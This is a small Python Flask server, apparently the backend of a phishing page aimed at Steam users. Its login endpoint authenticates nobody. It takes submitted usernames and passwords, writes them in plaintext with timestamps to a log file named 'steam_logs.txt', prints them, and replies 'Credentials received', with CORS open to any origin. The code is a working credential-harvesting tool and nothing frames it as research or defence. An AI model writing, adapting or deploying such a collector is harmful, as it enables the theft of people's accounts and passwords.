from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app)

LOG_FILE = "steam_logs.txt"

@app.route("/")
def index():
    return "Backend is running."

@app.route("/api/login", methods=["POST"])
def handle_login():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    username = data.get("username")
    password = data.get("password")

    if not username or not password:
        return jsonify({"status": "error", "message": "Missing username or password"}), 400

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Username: {username}, Password: {password}\n"

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
        print(f"Logged: {log_entry.strip()}")
        return jsonify({"status": "success", "message": "Credentials received"}), 200
    except Exception as e:
        print(f"Error writing to log file: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1084)
